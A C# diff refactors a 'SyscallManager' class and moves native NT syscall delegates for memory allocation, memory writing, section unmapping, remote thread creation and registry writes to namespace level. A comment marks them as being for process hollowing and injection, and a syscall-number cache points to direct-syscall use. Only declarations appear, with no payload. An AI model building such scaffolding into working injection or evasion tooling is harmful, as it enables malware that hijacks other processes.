@@ -5,7 +5,7 @@ using System.Text;
 
 namespace VanguardCore
 {
-    public static unsafe class SyscallManager
+    public static unsafe partial class SyscallManager
     {
         // --- Native Structures for Registry & Objects ---
         [StructLayout(LayoutKind.Sequential)]
@@ -36,23 +36,25 @@ namespace VanguardCore
 
         [StructLayout(LayoutKind.Sequential)]
         public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1; public IntPtr PebBaseAddress; public IntPtr Reserved2_1; public IntPtr Reserved2_2; public IntPtr UniqueProcessId; public IntPtr Reserved3; }
+    }
 
-        // --- Critical Syscall Delegates (Restored for Hollowing/Injection) ---
-        public delegate uint NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits, ref UIntPtr regionSize, uint allocationType, uint protect);
-        public delegate uint NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferLength, out IntPtr bytesWritten);
-        public delegate uint NtReadVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferLength, out IntPtr bytesRead);
-        public delegate uint NtUnmapViewOfSection(IntPtr processHandle, IntPtr baseAddress);
-        public delegate uint NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref PROCESS_BASIC_INFORMATION processInformation, uint processInformationLength, out uint returnLength);
-        public delegate uint NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr bytesBuffer);
-        public delegate uint NtResumeThread(IntPtr threadHandle, out uint suspendCount);
-        public delegate uint NtFreeVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref UIntPtr regionSize, uint freeType);
-        public delegate uint NtTerminateProcess(IntPtr processHandle, uint exitStatus);
-        public delegate uint NtProtectVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref uint regionSize, uint newProtect, out uint oldProtect);
-        
-        public delegate uint NtCreateKey(out IntPtr keyHandle, uint desiredAccess, ref OBJECT_ATTRIBUTES objectAttributes, uint titleIndex, IntPtr classStr, uint createOptions, out uint disposition);
-        public delegate uint NtSetValueKey(IntPtr keyHandle, ref UNICODE_STRING valueName, uint titleIndex, uint type, byte[] data, uint cbData);
+    // --- Critical Syscall Delegates (Moved to Namespace Level for Global Access) ---
+    public delegate uint NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits, ref UIntPtr regionSize, uint allocationType, uint protect);
+    public delegate uint NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferLength, out IntPtr bytesWritten);
+    public delegate uint NtReadVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferLength, out IntPtr bytesRead);
+    public delegate uint NtUnmapViewOfSection(IntPtr processHandle, IntPtr baseAddress);
+    public delegate uint NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref SyscallManager.PROCESS_BASIC_INFORMATION processInformation, uint processInformationLength, out uint returnLength);
+    public delegate uint NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr bytesBuffer);
+    public delegate uint NtResumeThread(IntPtr threadHandle, out uint suspendCount);
+    public delegate uint NtFreeVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref UIntPtr regionSize, uint freeType);
+    public delegate uint NtTerminateProcess(IntPtr processHandle, uint exitStatus);
+    public delegate uint NtProtectVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref uint regionSize, uint newProtect, out uint oldProtect);
+    
+    public delegate uint NtCreateKey(out IntPtr keyHandle, uint desiredAccess, ref SyscallManager.OBJECT_ATTRIBUTES objectAttributes, uint titleIndex, IntPtr classStr, uint createOptions, out uint disposition);
+    public delegate uint NtSetValueKey(IntPtr keyHandle, ref SyscallManager.UNICODE_STRING valueName, uint titleIndex, uint type, byte[] data, uint cbData);
 
-        [StructLayout(LayoutKind.Sequential)]
+    public static unsafe partial class SyscallManager
+    {
         private struct SYSCALL_ENTRY { public uint SSN; public IntPtr pAddress; }
 
         private static Dictionary<uint, SYSCALL_ENTRY> _syscallCache = new Dictionary<uint, SYSCALL_ENTRY>();
